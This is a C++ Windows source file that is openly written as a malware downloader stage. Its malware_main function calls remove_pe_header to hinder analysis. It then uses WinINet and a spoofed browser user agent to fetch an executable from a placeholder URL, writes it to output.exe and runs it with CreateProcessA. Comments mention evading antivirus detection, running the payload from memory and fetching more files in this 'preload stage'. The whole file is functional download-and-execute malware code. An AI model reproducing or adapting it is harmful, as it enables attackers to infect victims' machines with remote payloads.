#pragma once

#define test 0x101112131415

#include <Windows.h>
#include <Wininet.h>
#include <stdio.h>
#include "..\remove_pe_header.h"

#pragma comment(lib, "Wininet.lib")

#define BYTES2READ 40960 
#define DOWNLOADEDFILE_LOCALNAME "output.exe"

//forward declarations
int		downloadDaFile ( const char*, const char* );

void malware_main ( ) {
	int _sig = SIGNATURE;
	remove_pe_header ( );
	printf ( "remove_pe_header()\n" );

	int retVal = 0;
	const char fileName[ ] = DOWNLOADEDFILE_LOCALNAME;
	LPSTR lp_fileName = const_cast<LPSTR>( fileName );
	const char downloadTarget[ ] = "http://exmaple.com/uploads/notepad.exe";
	
	retVal = downloadDaFile ( fileName, downloadTarget );

	if ( retVal ) {
		return; //somethin went wrong downloading. please consulte figure 8 ball for more details
	}

	STARTUPINFOA si;
	PROCESS_INFORMATION pi;

	ZeroMemory ( &si, sizeof ( si ) );
	si.cb = sizeof ( si );
	ZeroMemory ( &pi, sizeof ( pi ) );

	retVal = CreateProcessA	 ( fileName,	// No module name (use command line)
							 NULL,			// Command line
							 NULL,          // Process handle not inheritable
							 NULL,          // Thread handle not inheritable
							 FALSE,         // Set handle inheritance to FALSE
							 0,             // No creation flags
							 NULL,          // Use parent's environment block
							 NULL,          // Use parent's starting directory 
							 &si,           // Pointer to STARTUPINFO structure
							 &pi );			// Pointer to PROCESS_INFORMATION structure
	if ( !retVal ) {
		printf ( "CreateProcess failed (%d).\n", GetLastError ( ) );
		
		LPVOID lpMsgBuf;
		LPVOID lpDisplayBuf;

		FormatMessage (
			FORMAT_MESSAGE_ALLOCATE_BUFFER |
			FORMAT_MESSAGE_FROM_SYSTEM |
			FORMAT_MESSAGE_IGNORE_INSERTS,
			NULL,
			GetLastError(),
			MAKELANGID ( LANG_NEUTRAL, SUBLANG_DEFAULT ),
			( LPTSTR )&lpMsgBuf,
			0, NULL );

		printf ( "%s failed with error %d: %s", "createProcess", GetLastError ( ), lpMsgBuf );
		
		return;
	}
	
	// Wait until child process exits.
	WaitForSingleObject ( pi.hProcess, INFINITE );

	// Close process and thread handles. 
	CloseHandle ( pi.hProcess );
	CloseHandle ( pi.hThread );

	printf ( "process finished executing\n");
	
	return ;
}

int downloadDaFile ( const char* fileName, const char* downloadTarget ) 
{
	/**
	*1. call InternetOpen() https://msdn.microsoft.com/en-us/library/windows/desktop/aa385096(v=vs.85).aspx
	*2. call InternetConnect() https://msdn.microsoft.com/en-us/library/windows/desktop/aa384363(v=vs.85).aspx
	*3v1. call HttpOpenRequest() https://msdn.microsoft.com/en-us/library/windows/desktop/aa384233(v=vs.85).aspx
	*4v1. call HttpSendRequest() https://msdn.microsoft.com/en-us/library/windows/desktop/aa384233(v=vs.85).aspx / maybe downlaod + execute file. maybe that's a little too suspicious to AV programs. 
	*5v1. call InternetCloseHandlE() https://msdn.microsoft.com/en-us/library/windows/desktop/aa384350(v=vs.85).asphx

	*3v2. call InternetOpenUrl()	https://msdn.microsoft.com/en-us/library/windows/desktop/aa385098(v=vs.85).aspx - more manual version of above
	*4v2. call InternetReadFile()	https://msdn.microsoft.com/en-us/library/windows/desktop/aa385103(v=vs.85).aspx - read to buffer
	*5v2. possible to memory map this file the execute it from here?
	**/

	//just some annoying wininet handles
	HINTERNET hInternet;
	HINTERNET hConnect;
	HINTERNET hRequest;
	HINTERNET hFile;
	//buffer for the file
	LPVOID lpBuffer = NULL;
	char *szBuffer = 0;
	const char domain[ ] = "example.com";
	BOOL retInternetReadFile = FALSE;
	DWORD dwNumberOfBytesToRead = 1024;
	DWORD dwNumberOfBytesRead;

	//connection details, mostly irrelevant 
	DWORD dwContext = 0xDEADB33F;
	LPCSTR userAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko";

	//file writing
	DWORD dwPtr;

	//error 
	DWORD lpdwError;
	LPSTR *lpszBuffer = NULL;
	DWORD lpdwBufferLength = 1000;

	printf ( "InternetOpenA()\n" );
	//ascii for life
	hInternet = InternetOpenA ( userAgent,
								INTERNET_OPEN_TYPE_DIRECT,
								NULL, //no proxy 
								NULL,
								NULL //no need for any of these flags
	);
	if ( hInternet == NULL ) {
		//failed. 
		printf ( "%d", GetLastError ( ) );
		exit ( -1 );
	}

	printf ( "InternetConnectA()\n" );
	hConnect = InternetConnectA ( hInternet,
								  domain,//currently im manually specifying the domain, this could be handled by strch on the odwnload target
								  INTERNET_DEFAULT_HTTP_PORT, //his is obvious
								  NULL,
								  NULL,
								  INTERNET_SERVICE_HTTP,
								  NULL, //no im not providing anything
								  dwContext
	);
	if ( hConnect == NULL ) {
		InternetCloseHandle ( hConnect );
		return 2;
	}
	printf ( "running InternetOpenUrlA\n" );

	
	hFile = InternetOpenUrlA ( hInternet,
							   downloadTarget,
							   NULL,//see https://msdn.microsoft.com/en-us/library/windows/desktop/aa384247(v=vs.85).aspx lpszHeaders [in] section for detail
							   NULL, //see above
							   INTERNET_FLAG_NO_COOKIES /*no cookies, i dont see anyone authenticating to downloading their malware*/ |
							   INTERNET_FLAG_NO_UI /*buttr safe then sorry*/ |
							   INTERNET_FLAG_PRAGMA_NOCACHE /* */ |
							   INTERNET_FLAG_RELOAD, /* might increase fingerprinting ability*/
							   dwContext );
	if ( hFile == NULL ) {
		InternetCloseHandle ( hConnect );
		InternetCloseHandle ( hInternet );
		return 3;
	}

	printf ( "running CreateFileA\n" );

	// finsihed internet aspect, now with file manipulation
	//fails if the file already exists.
	//will compare current file with existing file
	HANDLE hMalware;
	hMalware = CreateFileA ( ( LPCSTR )fileName, 
							 GENERIC_READ | GENERIC_WRITE,
							 0,
							 NULL, //security attributes, no child process anyways
							 OPEN_ALWAYS, //always open 
							 FILE_ATTRIBUTE_NORMAL,
							 NULL // honestly, since when does anyone use file templates
	);
	
	printf ( "file created lol\n" );

	if ( hMalware == INVALID_HANDLE_VALUE ) {
		printf ( "failed with file. wutwut\n" );
		InternetCloseHandle ( hConnect );
		InternetCloseHandle ( hInternet );

		return 4;
	}

	dwPtr = SetFilePointer ( hMalware, 0, NULL, FILE_BEGIN ); //set pointer position to end file
															  
	printf ( "file created\n" );

	szBuffer = ( char* )malloc ( dwNumberOfBytesToRead * sizeof ( char ) );

	do {
		if ( InternetReadFile ( hFile,
								szBuffer,
								dwNumberOfBytesToRead,
								&dwNumberOfBytesRead ) ) {

			if ( dwNumberOfBytesRead == 0 ) {
				printf ( "finished downloading file\n" );
				break;
			}

			if ( WriteFile ( hMalware, szBuffer, dwNumberOfBytesRead, &dwPtr, NULL ) == 0 ) {
				DWORD error = GetLastError ( );
				printf ( "failed for some reason\n%d\n", error );
				InternetCloseHandle ( hConnect );
				InternetCloseHandle ( hInternet );
				free ( szBuffer );
				return 5;
				//break;
			}
		} else {
			if ( GetLastError ( ) != ERROR_INSUFFICIENT_BUFFER )
			{
				printf ( "read error\n" );
				InternetCloseHandle ( hConnect );
				InternetCloseHandle ( hInternet );
				free ( szBuffer );
				return 6;
			}
			printf ( "%d", GetLastError ( ) );
			InternetCloseHandle ( hConnect );
			InternetCloseHandle ( hInternet );
			free ( szBuffer );
			return 7;
		}
	} while ( true );

	free ( szBuffer );

	//finsih up all that internet stuff, this could be done earlier but you might want to download MORE files in this preload stage
	InternetCloseHandle ( hConnect );
	InternetCloseHandle ( hInternet );
	CloseHandle ( hMalware );
	return 0;
}